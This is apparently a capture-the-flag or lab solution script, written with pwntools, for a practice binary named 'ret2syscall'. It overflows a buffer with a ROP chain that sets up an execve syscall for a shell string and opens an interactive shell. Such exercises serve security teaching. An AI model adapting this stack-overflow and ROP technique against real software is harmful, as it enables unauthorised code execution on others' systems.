from pwn import *

io = process("./ret2syscall")

context.log_level = 'debug'

eax_addr = 0x080bb196   # pop eax;ret
edx_ecx_ebx_addr = 0x0806eb90  # pop edx ; pop ecx ; pop ebx ; ret
int_addr = 0x08049421
shell_addr = 0x080be408

payload = b'a'*112+p32(eax_addr)+p32(0xb)+p32(edx_ecx_ebx_addr)+p32(0)+p32(0)+p32(shell_addr)+p32(int_addr)

io.recvuntil(b'an to do?')
io.sendline(payload)

io.interactive()